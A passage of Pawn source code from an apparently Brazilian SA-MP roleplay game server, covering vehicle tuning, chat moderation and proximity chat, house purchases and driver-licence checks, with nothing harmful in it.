				if(cInfo[CasaInfo[c][Numero]][t_Escapamento] != -1 || cInfo[CasaInfo[c][Numero]][t_Escapamento] != 0)
				{
				    if(IsVehicleUpgradeCompatible(GetVehicleModel(vehicleid), cInfo[CasaInfo[c][Numero]][t_Escapamento]))
				    {
			    		AddVehicleComponent(cInfo[CasaInfo[c][Numero]][HouseCar], cInfo[CasaInfo[c][Numero]][t_Escapamento]);
			    	}
				}
				if(cInfo[CasaInfo[c][Numero]][t_Bventr] != -1 || cInfo[CasaInfo[c][Numero]][t_Bventr] != 0)
				{
				    if(IsVehicleUpgradeCompatible(GetVehicleModel(vehicleid), cInfo[CasaInfo[c][Numero]][t_Bventr]))
				    {
			    		AddVehicleComponent(cInfo[CasaInfo[c][Numero]][HouseCar], cInfo[CasaInfo[c][Numero]][t_Bventr]);
			    	}
				}
				if(cInfo[CasaInfo[c][Numero]][t_Bventl] != -1 || cInfo[CasaInfo[c][Numero]][t_Bventl] != 0)
				{
				    if(IsVehicleUpgradeCompatible(GetVehicleModel(vehicleid), cInfo[CasaInfo[c][Numero]][t_Bventl]))
				    {
			    		AddVehicleComponent(cInfo[CasaInfo[c][Numero]][HouseCar], cInfo[CasaInfo[c][Numero]][t_Bventl]);
			    	}
				}
				if(cInfo[CasaInfo[c][Numero]][t_Bscoop] != -1 || cInfo[CasaInfo[c][Numero]][t_Bscoop] != 0)
				{
				    if(IsVehicleUpgradeCompatible(GetVehicleModel(vehicleid), cInfo[CasaInfo[c][Numero]][t_Bscoop]))
				    {
			    		AddVehicleComponent(cInfo[CasaInfo[c][Numero]][HouseCar], cInfo[CasaInfo[c][Numero]][t_Bscoop]);
			    	}
				}
				if(cInfo[CasaInfo[c][Numero]][t_Rscoop] != -1 || cInfo[CasaInfo[c][Numero]][t_Rscoop] != 0)
				{
				    if(IsVehicleUpgradeCompatible(GetVehicleModel(vehicleid), cInfo[CasaInfo[c][Numero]][t_Rscoop]))
				    {
			    		AddVehicleComponent(cInfo[CasaInfo[c][Numero]][HouseCar], cInfo[CasaInfo[c][Numero]][t_Rscoop]);
			    	}
				}
				if(cInfo[CasaInfo[c][Numero]][t_Lskirt] != -1 || cInfo[CasaInfo[c][Numero]][t_Lskirt] != 0)
				{
				    if(IsVehicleUpgradeCompatible(GetVehicleModel(vehicleid), cInfo[CasaInfo[c][Numero]][t_Lskirt]))
				    {
			    		AddVehicleComponent(cInfo[CasaInfo[c][Numero]][HouseCar], cInfo[CasaInfo[c][Numero]][t_Lskirt]);
			    	}
				}
				if(cInfo[CasaInfo[c][Numero]][t_Rskirt] != -1 || cInfo[CasaInfo[c][Numero]][t_Rskirt] != 0)
				{
				    if(IsVehicleUpgradeCompatible(GetVehicleModel(vehicleid), cInfo[CasaInfo[c][Numero]][t_Rskirt]))
				    {
			    		AddVehicleComponent(cInfo[CasaInfo[c][Numero]][HouseCar], cInfo[CasaInfo[c][Numero]][t_Rskirt]);
			    	}
				}
				if(cInfo[CasaInfo[c][Numero]][t_Base] != -1 || cInfo[CasaInfo[c][Numero]][t_Base] != 0)
				{
				    if(IsVehicleUpgradeCompatible(GetVehicleModel(vehicleid), cInfo[CasaInfo[c][Numero]][t_Base]))
				    {
			    		AddVehicleComponent(cInfo[CasaInfo[c][Numero]][HouseCar], cInfo[CasaInfo[c][Numero]][t_Base]);
			    	}
				}
				if(cInfo[CasaInfo[c][Numero]][t_Rbbars] != -1 || cInfo[CasaInfo[c][Numero]][t_Rbbars] != 0)
				{
				    if(IsVehicleUpgradeCompatible(GetVehicleModel(vehicleid), cInfo[CasaInfo[c][Numero]][t_Rbbars]))
				    {
			    		AddVehicleComponent(cInfo[CasaInfo[c][Numero]][HouseCar], cInfo[CasaInfo[c][Numero]][t_Rbbars]);
					}
				}
				if(cInfo[CasaInfo[c][Numero]][t_Fbbars] != -1 || cInfo[CasaInfo[c][Numero]][t_Fbbars] != 0)
				{
				    if(IsVehicleUpgradeCompatible(GetVehicleModel(vehicleid), cInfo[CasaInfo[c][Numero]][t_Fbbars]))
				    {
			    		AddVehicleComponent(cInfo[CasaInfo[c][Numero]][HouseCar], cInfo[CasaInfo[c][Numero]][t_Fbbars]);
			    	}
				}
				if(cInfo[CasaInfo[c][Numero]][t_Lights] != -1 || cInfo[CasaInfo[c][Numero]][t_Lights] != 0)
				{
				    if(IsVehicleUpgradeCompatible(GetVehicleModel(vehicleid), cInfo[CasaInfo[c][Numero]][t_Lights]))
				    {
			    		AddVehicleComponent(cInfo[CasaInfo[c][Numero]][HouseCar], cInfo[CasaInfo[c][Numero]][t_Lights]);
			    	}
				}
				/**/
				if(cInfo[CasaInfo[c][Numero]][t_PaintJob] != -1)
				{
			    	AddVehicleComponent(cInfo[CasaInfo[c][Numero]][HouseCar], cInfo[CasaInfo[c][Numero]][t_PaintJob]);
			    }
			    ChangeVehicleColor(cInfo[CasaInfo[c][Numero]][HouseCar], cInfo[CasaInfo[c][Numero]][t_Cor_1], cInfo[CasaInfo[c][Numero]][t_Cor_2]);
                ChangeVehiclePaintjob(cInfo[CasaInfo[c][Numero]][HouseCar], cInfo[CasaInfo[c][Numero]][t_PaintJob]);
				vHouse[cInfo[CasaInfo[c][Numero]][HouseCar]] = 1;
			    break;
			}
		}
	}
	/*if(IsValidVehicleSet(vehicleid))
	{
		format(gStr, sizeof(gStr), "Sets/%d.ini", s_SetVID[vehicleid]);
		ChangeVehicleColor(vehicleid, WE_GetInt(gStr, "v_cor_1"), WE_GetInt(gStr, "v_cor_2"));
	}*/
	return 1;
}

public OnVehicleDeath(vehicleid)
{
	new Float:P[3]; GetVehiclePos(vehicleid, P[0], P[1], P[2]);
	if(P[2] <= 0.4) return true; //Water Exception.. (added later)

	new model = GetVehicleModel(vehicleid);
	switch(model)
	{
	    case PLANES: return true;
	    case HELIS: return true;
	    default:
	    {
	    	new
				ht = random(EFFECT_RANDOM),
				xang = random(EFFECT_RANDOM)-EFFECT_FIX_DEFAULT,
				yang = random(EFFECT_RANDOM)-EFFECT_FIX_DEFAULT,
				zang = random(EFFECT_RANDOM)
			;
			GetVehiclePos(vehicleid, P[0], P[1], P[2]);
			CreateExplosion(P[0], P[1], P[2]+EFFECT_EXPLOSIONOFFSET, EFFECT_EXPLOSIONTYPE, EFFECT_EXPLOSIONRADIUS);
			SetVehicleAngularVelocity(vehicleid, xang*EFFECT_MULTIPLIER, yang*EFFECT_MULTIPLIER, zang*EFFECT_FIX_Z);
			GetVehicleVelocity(vehicleid, P[0], P[1], P[2]);
			SetVehicleVelocity(vehicleid, P[0], P[1], P[2] + (ht*EFFECT_FIX_Z));
		}
	}
    estCamB[vehicleid] = 0;
    return 1;
}

public OnPlayerText(playerid, text[])
{
    if(floodChat[playerid] > gettime())
	{
	    if(aInfo[playerid][Admin] == 0 && aInfo[playerid][Moderador] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Evite cometer flood no chat!");
	        return 0;
        }
	}
    floodChat[playerid] = gettime() + 2;
    TempoAFK[playerid] = 0;

	if(aInfo[playerid][Admin] == 0)
	{
		if(strlen(text) == strlen(digitouChat[playerid]) && !strcmp(digitouChat[playerid], text, false))
		{
   			SendClientMessage(playerid, 0x93B800FF, "Não efetue a repetição de mensagens!");
			return 0;
		}
	}
	if(pInfo[playerid][Logado] == false)
	{
		SendClientMessage(playerid, COR_AZULCLARO, "Você não está logado portando não pode usar o chat!");
		return 0;
	}
	if(ChatStatus == 1 && aInfo[playerid][Admin] == 0 && aInfo[playerid][Moderador] == 0 && text[0] != '#' && text[0] != '!')
	{
		SendClientMessage(playerid, COR_ERRO, "O chat está desativado!");
		return 0;
	}
    if(pInfo[playerid][AFK] == true)
	{
		SendClientMessage(playerid, COR_AZULCLARO, "Você não pode usar o chat enquanto está AFK!");
    	return 0;
	}
	if(Calado[playerid] == true)
	{
		SendClientMessage(playerid, COR_ERRO, "Você está calado e não pode falar nada!");
		return 0;
    }
	if(strfind(text, ":777", true) != -1 || strfind(text, ":888", true) != -1)
    {
        format(gstring, sizeof(gstring),"%s foi kickado por suspeita de estar divulgando um IP!", PlayerName(playerid));
		SendClientMessageToAll(COR_BRANCO, gstring);
        return Kick(playerid), 0;
    }
    if(strfind(text, ".blogspot", true) != -1 || strfind(text, ".forumfacil", true) != -1)
    {
        format(gstring, sizeof(gstring),"%s foi kickado por suspeita de estar divulgando um site!", PlayerName(playerid));
		SendClientMessageToAll(COR_BRANCO, gstring);
        return Kick(playerid), 0;
    }
	new
		tmp[128]
	;
    // -- ANÚNCIOS ADMINS
   	if(text[0] == '*')
    {
        if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || aInfo[playerid][Ajudante] == 1 || aInfo[playerid][Corregedor] == 1)
        {
			strmid(tmp, text, 1, strlen(text));
			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COR_ERRO, "Uso válido: * [Mensagem]");
			    return 1;
			}
			else
			{
   				if(aInfo[playerid][Admin] == 1)
       			{
					format(gStr, sizeof(gStr), "Administrador(a) %s {FFFFFF}%s", PlayerName(playerid), tmp);
     				SendClientMessageToAll(AZUL_WE, gStr);
             	}
            	else if(aInfo[playerid][Moderador] == 1)
            	{
             		format(gStr, sizeof(gStr), "Moderador(a) %s {FFFFFF}%s", PlayerName(playerid), tmp);
               		SendClientMessageToAll(AZUL_WE, gStr);
			    }
            	else if(aInfo[playerid][Ajudante] == 1)
            	{
             		format(gStr, sizeof(gStr), "Ajudante %s {FFFFFF}%s", PlayerName(playerid), tmp);
               		SendClientMessageToAll(AZUL_WE, gStr);
			    }
			    else if(aInfo[playerid][Corregedor] == 1)
			    {
			        format(gStr, sizeof(gStr), "Corregedor(a) %s {FFFFFF}%s", PlayerName(playerid), tmp);
			        SendClientMessageToAll(AZUL_WE, gStr);
				}
       			return 0;
			}
        }
    }
	if(text[0] == '@')
	{
 		if(aInfo[playerid][Admin] == 1)
   		{
			strmid(tmp, text, 1, strlen(text));
	    	if(!strlen(tmp))
	 		{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: @ [Mensagem]");
				return 1;
	       	}
	    	else
	      	{
	        	format(gstring, sizeof(gstring), "~p~] ~w~%s ~p~]", tmp);
	         	GameTextForAll(gstring, 5000, 3);
	     	}
	      	return 0;
        }
	}
	if(text[0] == '-')
	{
	    if(aInfo[playerid][Admin] == 1)
	    {
			strmid(tmp, text, 1, strlen(text));
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: - [Mensagem]");
				return 1;
            }
            else
            {
                format(gstring, sizeof(gstring), "~b~~h~%s", tmp);
                GameTextForAll(gstring, 5000, 3);
            }
            return 0;
		}
	}
	if(text[0] == '$')
	{
	    if(aInfo[playerid][Admin] == 1)
	    {
			strmid(tmp, text, 1, strlen(text));
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: $ [Mensagem]");
				return 1;
            }
            else
            {
                format(gstring, sizeof(gstring), "~g~~h~~h~%s: ~w~~h~%s", PlayerName(playerid),  tmp);
                GameTextForAll(gstring, 5000, 3);
            }
            return 0;
		}
	}
 	// -- CHAT MODERADORES & ADMINS
	if(text[0] == '+')
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
		{
			strmid(tmp, text, 1, strlen(text));
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: + [Mensagem]");
				return 1;
			}
			else
			{
			    foreach(Player, i)
				{
					if(aInfo[i][Admin] == 1 || aInfo[i][Moderador] == 1)
					{
						format(gStr, sizeof(gStr), "(ChatEquipe {FF1E1E}WE{1E90FF}) %s [%d]: %s", PlayerName(playerid), playerid, tmp);
						SendClientMessage(i, 0x1E90FFAA, gStr);
		    		}
	    		}
		    	return 0;
			}
		}
	}
	// -- CHAT VIP
	if(text[0] == '.')
	{
		if(pInfo[playerid][PLAYER_VIP] == 1)
		{
			strmid(tmp, text, 1, strlen(text));
   			if(!strlen(tmp))
	    	{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: . [Mensagem]");
	    	}
	    	foreach(Player, i)
	    	{
				if(pInfo[i][PLAYER_VIP] == 1)
	          	{
	         		format(gstring, sizeof(gstring), "{1E90FF}[ChatVIP] {FFFFFF}%s {FF1E1E}%s", PlayerName(playerid),  tmp);
  					SendClientMessage(i, 0xFFFFFFAA, gstring);
	            }
			}
			return 0;
		}
	}
	// -- CHAT DE ADMIN
	if(text[0] == '#')
	{
	 	if(aInfo[playerid][Admin] == 1)
	  	{
			strmid(tmp, text, 1, strlen(text));
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: # [Mensagem]");
			}
			else
			{
			    foreach(Player, i)
			    {
				    if(aInfo[i][Admin] == 1)
					{
						format(gStr, sizeof(gStr), "(ChatAdmins) %s [%d]: %s", PlayerName(playerid), playerid, tmp);
						SendClientMessage(i, 0x90EE90AA, gStr);
				    }
				}
	        }
	        return 0;
	    }
	 }
	// -- CHAT GLOBAL
	foreach(Player, i)
	{
		if(pInfo[i][Logado] == true)
		{
			//if(aInfo[playerid][Admin] == 0 && aInfo[playerid][Moderador] == 0 && aInfo[playerid][Ajudante] == 0 && aInfo[playerid][Corregedor] == 0)
			//{
				strmid(tmp, text,0,strlen(text));
				if(strlen(tmp) > 128)
				{
					SendClientMessage(playerid, COR_ERRO, "Mensagem muito grande!");
					return 0;
				}
				else
				{
				    new cstring[150];
					new
						Float:chatX, Float:chatY, Float:chatZ
					;
					GetPlayerPos(playerid, chatX, chatY, chatZ);
                    if(IsShout(text))
                    {
	            		if(IsPlayerInRangeOfPoint(i, 25.0, chatX, chatY, chatZ))
						{
							format(cstring, sizeof(cstring), "%s grita: %s", GetName(playerid, true), text);
							SendClientMessage(i, -1, cstring);
						}
					}
					else
					{
	            		if(IsPlayerInRangeOfPoint(i, 5.0, chatX, chatY, chatZ))
						{
							format(cstring, sizeof(cstring), "%s diz: %s", GetName(playerid, true), text);
							SendClientMessage(i, COLOR_FADE1, cstring);
						}
	            		else if(IsPlayerInRangeOfPoint(i, 10.0, chatX, chatY, chatZ))
						{
							format(cstring, sizeof(cstring), "%s diz: %s", GetName(playerid, true), text);
							SendClientMessage(i, COLOR_FADE2, cstring);
						}
	            		else if(IsPlayerInRangeOfPoint(i, 15.0, chatX, chatY, chatZ))
						{
							format(cstring, sizeof(cstring), "%s diz: %s", GetName(playerid, true), text);
							SendClientMessage(i, COLOR_FADE3, cstring);
						}
					}
				 }
			/*}
			else
			{
				new
					Float:chatX, Float:chatY, Float:chatZ
				;
				GetPlayerPos(playerid, chatX, chatY, chatZ);

				if(aInfo[playerid][Admin] == 1)
				{
				 	strmid(tmp, text,0,strlen(text));
				 	format(gstring, sizeof(gstring), "[WE] [%d] %s{FFFFFF}  %s", playerid, PlayerName(playerid), tmp);

				 	if(pInfo[playerid][chat] == 0)
					{
					 	if(IsPlayerInRangeOfPoint(i, 15.0, chatX, chatY, chatZ))
						{
							SendClientMessage(i, GetPlayerColor(playerid), gstring);
				 		}
					}
					if(pInfo[playerid][chat] == 1)
					{
				 		SendClientMessage(i, GetPlayerColor(playerid), gstring);
					}
				}
				if(aInfo[playerid][Moderador] == 1)
				{
				 	strmid(tmp, text,0,strlen(text));
					format(gstring, sizeof(gstring), "[WE] [%d] %s{FFFFFF}  %s", playerid, PlayerName(playerid), tmp);

					if(pInfo[playerid][chat] == 0)
					{
						if(IsPlayerInRangeOfPoint(i, 15.0, chatX, chatY, chatZ))
						{
						 	SendClientMessage(i, GetPlayerColor(playerid), gstring);
				 		}
					}
				 	if(pInfo[playerid][chat] == 1)
				 	{
				 		SendClientMessage(i, GetPlayerColor(playerid), gstring);
					}
				}
				if(aInfo[playerid][Ajudante] == 1)
				{
				 	strmid(tmp, text,0,strlen(text));
					format(gstring, sizeof(gstring), "[WE] [%d] %s{FFFFFF}  %s", playerid, PlayerName(playerid), tmp);

					if(pInfo[playerid][chat] == 0)
					{
						if(IsPlayerInRangeOfPoint(i, 15.0, chatX, chatY, chatZ))
						{
						 	SendClientMessage(i, GetPlayerColor(playerid), gstring);
				 		}
					}
				 	if(pInfo[playerid][chat] == 1)
				 	{
				 		SendClientMessage(i, GetPlayerColor(playerid), gstring);
					}
				}
				if(aInfo[playerid][Corregedor] == 1)
				{
				 	strmid(tmp, text,0,strlen(text));
					format(gstring, sizeof(gstring), "[WE] [%d] %s{FFFFFF}  %s", playerid, PlayerName(playerid), tmp);

					if(pInfo[playerid][chat] == 0)
					{
						if(IsPlayerInRangeOfPoint(i, 15.0, chatX, chatY, chatZ))
						{
						 	SendClientMessage(i, GetPlayerColor(playerid), gstring);
				 		}
					}
				 	if(pInfo[playerid][chat] == 1)
				 	{
				 		SendClientMessage(i, GetPlayerColor(playerid), gstring);
					}
				}
				if(pInfo[playerid][PLAYER_VIP] == 1 && aInfo[playerid][Admin] == 0)
				{
					strmid(tmp, text,0,strlen(text));
				 	format(gstring, sizeof(gstring), "[%d] [VIP] %s{FFFFFF}  %s", playerid, PlayerName(playerid), tmp);

					if(IsPlayerInRangeOfPoint(i, 15.0, chatX, chatY, chatZ))
					{
				 		SendClientMessage(i, GetPlayerColor(playerid), gstring);
					}
				}
			}*/
		}
	}
	format(digitouChat[playerid], 128, "%s", text);
	return 0;
}

//final

/*public MesagemClaConvite(playerid)
{
	if(msgcount[playerid] >= 5)
	{
	    KillTimer(timercou[playerid]);
	    format(gstring, sizeof(gstring), "Você demorou muito para responder e o convite para sem membro do clã %s foi cancelado!", playerClan[convidou[playerid]]);
		SendClientMessage(playerid, COR_ERRO, gstring);
 	    format(gstring, sizeof(gstring), "%s demorou para responder e o convite foi automaticamente cacenlado!", PlayerName(playerid));
		SendClientMessage(playerid, COR_ERRO, gstring);
		msgcount[playerid] = -1;
		convidou[playerid] = -1;
		msgconvi[playerid] = 0;
		return 1;
	}
	else if(msgcount[playerid] < 5)
	{
	    msgcount[playerid] ++;
		format(gstring, sizeof(gstring), "%s está convidando você para ser membro do clã '%s' (Use: /Aceitar ou /Recusar)", PlayerName(convidou[playerid]), playerClan[convidou[playerid]]);
        SendClientMessage(playerid, AZUL_WE, gstring);
		format(gstring, sizeof(gstring), "Aguardando a resposta de %s para ser membro do seu clã %s", PlayerName(playerid), playerClan[convidou[playerid]]);
        SendClientMessage(convidou[playerid], AZUL_WE, gstring);
        timercou[playerid] = SetTimerEx("MesagemClaConvite", 4000, false, "d", playerid);
		return 1;
	}
	return 1;
}

forward TempoCriarGangue(playerid);
public TempoCriarGangue(playerid)
{
    LiberadoGG[playerid] = 0;
	return 1;
}*/

forward LiberadoCasaID(playerid);
public LiberadoCasaID(playerid)
{
    LiberadoCasa[playerid] = 0;
	return 1;
}

forward ComprandoCasaOferecida(playerid);
public ComprandoCasaOferecida(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[HouseIP][PickupX], CasaInfo[HouseIP][PickupY], CasaInfo[HouseIP][PickupZ]))
	{
   		format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[HouseIP][Numero]);
		new
			zone[MAX_ZONE_NAME]
		;
		GetPlayer2DZone(playerid, zone, MAX_ZONE_NAME);
		format(gstring, sizeof(gstring), "Casa ID {FFFFFF}%d{00B503}, localizada em {FFFFFF}%s{00B503}, comprada por {FFFFFF}%s", CasaInfo[HouseIP][Numero], zone, PlayerName(playerid));
		SendClientMessageToAll(0x99FF66AA, gstring);
		DestroyPickup(CasaPickup[HouseIP]);
		CasaPickup[HouseIP] = CreatePickup(1272, 23, CasaInfo[HouseIP][PickupX], CasaInfo[HouseIP][PickupY], CasaInfo[HouseIP][PickupZ]);
		pInfo[playerid][Spawn] = 1;
		WE_SetInt(gFile, "Casa", CasaInfo[HouseIP][Numero]);
        WE_SetInt(gFile, "Spawn", 1);
		WE_SetString(hFile, "Proprietario", PlayerName(playerid));
		format(CasaInfo[HouseIP][Proprietario], 64, PlayerName(playerid));
		format(CasaInfo[HouseIP][Morador], 64, "Ninguem");
		format(CasaInfo[HouseIP][Morador2], 64, "Ninguem");
		format(CasaInfo[HouseIP][Morador3], 64, "Ninguem");
		WE_SetString(hFile, "Morador", "Ninguem");
		WE_SetString(hFile, "Morador2", "Ninguem");
		WE_SetString(hFile, "Morador3", "Ninguem");
		WE_SetInt(hFile, "Dono", 1);

		WE_SetString(hFile, "Login", WE_GetString(gFile, "ulData"));
		format(CasaInfo[HouseIP][Login], 12, WE_GetString(gFile, "ulData"));
		WE_SetString(hFile, "Horario", WE_GetString(gFile, "ulHorario"));
		format(CasaInfo[HouseIP][Horario], 12, WE_GetString(gFile, "ulHorario"));

		return 1;
	}
	LiberadoCasa[playerid] = 0,
	HouseIP = -1,
	Vendedor[playerid] = -1,
	MoneyHouse[RecebeuCasa[playerid]] = -1,
	RecebeuCasa[playerid] = -1;
	return 1;
}

forward Contagem();
public Contagem()
{
    if(NumeroCount == 0)
    {
    	foreach(Player, i)
		{
			TogglePlayerControllable(i, true);
			PlayerPlaySound(i, 1057, 0.0, 0.0, 0.0);
		}
    	format(gstring, sizeof(gstring), "~y~VALENDO~w~!");
		GameTextForAll(gstring, 1250, 5);
    	return 1;
    }
    foreach(Player, i)
	{
		TogglePlayerControllable(i, false);
		PlayerPlaySound(i, 1056, 0.0, 0.0, 0.0);
	}
    format(gstring, sizeof(gstring), "%d", NumeroCount);
	GameTextForAll(gstring, 1250, 5);
	NumeroCount --;
	SetTimer("Contagem", 1000, false);
	return 1;
}

public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	return 1;
}

public OnPlayerExitVehicle(playerid, vehicleid)
{
	return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{
    if(newstate == PLAYER_STATE_DRIVER)
    {
	    new
			veiculo = GetPlayerVehicleID(playerid)
		;
		if(pInfo[playerid][HabTCarro] == 0)
		{
		    if(EUmCarro(veiculo))
		    {
				if(pInfo[playerid][Level] > 2 && InAutoEscola[playerid] == 0 && InAutoEscola2[playerid] == 0  && InAutoEscola3[playerid] == 0
				&& InAutoEscola4[playerid] == 0 && InAutoEscola5[playerid] == 0 && InAutoEscola6[playerid] == 0)
				{
			   		SendClientMessage(playerid, COR_ERRO, "Não é permitido a condução de carros sem habilitação!");
					SendClientMessage(playerid, COR_ERRO, "Um anônimo lhe denunciou e você está sendo procurado pela polícia!");
					if(GetPlayerWantedLevel(playerid) < 6)
	         		{
						SetPlayerWantedLevel(playerid, GetPlayerWantedLevel(playerid) + 1);
					}
				}
				else if(pInfo[playerid][Level] < 2)
				{
			   		SendClientMessage(playerid, COR_ERRO, "Não é permitido a condução de carros sem habilitação!");
					SendClientMessage(playerid, COR_ERRO, "Poderá conduzir veículos sem habilitação até completar 2 níveis!");
				}
			}
		}
		if(pInfo[playerid][HabTMoto] == 0 && InAutoEscola[playerid] == 0)
		{
		    if(EUmaMoto(veiculo))
		    {
				if(pInfo[playerid][Level] > 2 && InAutoEscola[playerid] == 0 && InAutoEscola2[playerid] == 0  && InAutoEscola3[playerid] == 0
				&& InAutoEscola4[playerid] == 0 && InAutoEscola5[playerid] == 0 && InAutoEscola6[playerid] == 0)
				{
			   		SendClientMessage(playerid, COR_ERRO, "Não é permitido a condução de motos sem habilitação!");
					SendClientMessage(playerid, COR_ERRO, "Um anônimo lhe denunciou e você está sendo procurado pela polícia!");
					if(GetPlayerWantedLevel(playerid) < 6)
	         		{
						SetPlayerWantedLevel(playerid, GetPlayerWantedLevel(playerid) + 1);
					}
				}
				else if(pInfo[playerid][Level] < 2)
				{
			   		SendClientMessage(playerid, COR_ERRO, "Não é permitido a condução de motos sem habilitação!");
					SendClientMessage(playerid, COR_ERRO, "Poderá conduzir veículos sem habilitação até completar 2 níveis!");
				}
			}
		}
		if(pInfo[playerid][HabTCaminhao] == 0 && InAutoEscola[playerid] == 0)
		{
		    if(EUmCaminhao(veiculo))
		    {
				if(pInfo[playerid][Level] > 2 && InAutoEscola[playerid] == 0 && InAutoEscola2[playerid] == 0  && InAutoEscola3[playerid] == 0
				&& InAutoEscola4[playerid] == 0 && InAutoEscola5[playerid] == 0 && InAutoEscola6[playerid] == 0)
				{
			   		SendClientMessage(playerid, COR_ERRO, "Não é permitido a condução de caminhões sem habilitação!");
					SendClientMessage(playerid, COR_ERRO, "Um anônimo lhe denunciou e você está sendo procurado pela polícia!");
					if(GetPlayerWantedLevel(playerid) < 6)
	         		{
						SetPlayerWantedLevel(playerid, GetPlayerWantedLevel(playerid) + 1);
					}
				}
				else if(pInfo[playerid][Level] < 2)
				{
			   		SendClientMessage(playerid, COR_ERRO, "Não é permitido a condução de caminhões sem habilitação!");
					SendClientMessage(playerid, COR_ERRO, "Poderá conduzir veículos sem habilitação até completar 2 níveis!");
				}
			}
		}
		if(pInfo[playerid][HabTTrem] == 0 && InAutoEscola[playerid] == 0)
		{
		    if(EUmTrem(veiculo))
		    {
				if(pInfo[playerid][Level] > 2 && InAutoEscola[playerid] == 0 && InAutoEscola2[playerid] == 0  && InAutoEscola3[playerid] == 0
				&& InAutoEscola4[playerid] == 0 && InAutoEscola5[playerid] == 0 && InAutoEscola6[playerid] == 0)
				{
			   		SendClientMessage(playerid, COR_ERRO, "Não é permitido a condução de trens sem habilitação!");
					SendClientMessage(playerid, COR_ERRO, "Um anônimo lhe denunciou e você está sendo procurado pela polícia!");
					if(GetPlayerWantedLevel(playerid) < 6)
	         		{
						SetPlayerWantedLevel(playerid, GetPlayerWantedLevel(playerid) + 1);
					}
				}
				else if(pInfo[playerid][Level] < 2)
				{
			   		SendClientMessage(playerid, COR_ERRO, "Não é permitido a condução de trens sem habilitação!");
					SendClientMessage(playerid, COR_ERRO, "Poderá conduzir veículos sem habilitação até completar 2 níveis!");
				}
			}
		}
		if(pInfo[playerid][HabAHeli] == 0 && InAutoEscola[playerid] == 0)
		{
		    if(EUmHeli(veiculo))
		    {
				if(pInfo[playerid][Level] > 2 && InAutoEscola[playerid] == 0 && InAutoEscola2[playerid] == 0  && InAutoEscola3[playerid] == 0
				&& InAutoEscola4[playerid] == 0 && InAutoEscola5[playerid] == 0 && InAutoEscola6[playerid] == 0)
				{
			   		SendClientMessage(playerid, COR_ERRO, "Não é permitido a condução helicópteros sem habilitação!");
					SendClientMessage(playerid, COR_ERRO, "Um anônimo lhe denunciou e você está sendo procurado pela polícia!");
					if(GetPlayerWantedLevel(playerid) < 6)
	         		{
						SetPlayerWantedLevel(playerid, GetPlayerWantedLevel(playerid) + 1);
					}
				}
				else if(pInfo[playerid][Level] < 2)
				{
			   		SendClientMessage(playerid, COR_ERRO, "Não é permitido a condução de helicópteros sem habilitação!");
					SendClientMessage(playerid, COR_ERRO, "Poderá conduzir veículos sem habilitação até completar 2 níveis!");
				}
			}
		}
		if(pInfo[playerid][HabAAviao] == 0 && InAutoEscola[playerid] == 0)
		{
		    if(EUmAviao(veiculo))
		    {
				if(pInfo[playerid][Level] > 2 && InAutoEscola[playerid] == 0 && InAutoEscola2[playerid] == 0  && InAutoEscola3[playerid] == 0
				&& InAutoEscola4[playerid] == 0 && InAutoEscola5[playerid] == 0 && InAutoEscola6[playerid] == 0)
				{
			   		SendClientMessage(playerid, COR_ERRO, "Não é permitido a condução aviões sem habilitação!");
					SendClientMessage(playerid, COR_ERRO, "Um anônimo lhe denunciou e você está sendo procurado pela polícia!");
					if(GetPlayerWantedLevel(playerid) < 6)
	         		{
						SetPlayerWantedLevel(playerid, GetPlayerWantedLevel(playerid) + 1);
					}
				}
				else if(pInfo[playerid][Level] < 2)
				{
			   		SendClientMessage(playerid, COR_ERRO, "Não é permitido a condução aviões sem habilitação!");
					SendClientMessage(playerid, COR_ERRO, "Poderá conduzir veículos sem habilitação até completar 2 níveis!");
				}
			}
		}
		if(pInfo[playerid][HabNBarco] == 0 && InAutoEscola[playerid] == 0)
		{
		    if(EUmBarco(veiculo))
		    {
				if(pInfo[playerid][Level] > 2 && InAutoEscola[playerid] == 0 && InAutoEscola2[playerid] == 0  && InAutoEscola3[playerid] == 0
				&& InAutoEscola4[playerid] == 0 && InAutoEscola5[playerid] == 0 && InAutoEscola6[playerid] == 0)
				{
			   		SendClientMessage(playerid, COR_ERRO, "Não é permitido a condução barcos sem habilitação!");
					SendClientMessage(playerid, COR_ERRO, "Um anônimo lhe denunciou e você está sendo procurado pela polícia!");
					if(GetPlayerWantedLevel(playerid) < 6)
	         		{
						SetPlayerWantedLevel(playerid, GetPlayerWantedLevel(playerid) + 1);
					}
				}
				else if(pInfo[playerid][Level] < 2)
				{
			   		SendClientMessage(playerid, COR_ERRO, "Não é permitido a condução de barcos sem habilitação!");
					SendClientMessage(playerid, COR_ERRO, "Poderá conduzir veículos sem habilitação até completar 2 níveis!");
				}
			}
		}
	    if(EUmaMoto(veiculo))
		{
		    if(pInfo[playerid][StatusCapacete] == 1)
		    {
		        if(pInfo[playerid][ModeloCapacete] == 0) { SetPlayerAttachedObject(playerid, 5, 18645, 2, 0.07,0,0, 88, 75, 0); }
				if(pInfo[playerid][ModeloCapacete] == 1) { SetPlayerAttachedObject(playerid, 5, 18976, 2, 0.09, 0.03,0,88, 75, 0); }
	            if(pInfo[playerid][ModeloCapacete] == 2) { SetPlayerAttachedObject(playerid, 5, 18977, 2, 0.07,0,0, 88, 75, 0); }
	            if(pInfo[playerid][ModeloCapacete] == 3) { SetPlayerAttachedObject(playerid, 5, 18978, 2, 0.07,0,0, 88, 75, 0); }
	            if(pInfo[playerid][ModeloCapacete] == 4) { SetPlayerAttachedObject(playerid, 5, 18979, 2, 0.07,0,0, 88, 75, 0); }
		    }
		    else
		    {
     			SendClientMessage(playerid, COR_ERRO, "Você está sem capacete e poderá ser multado(a)!");
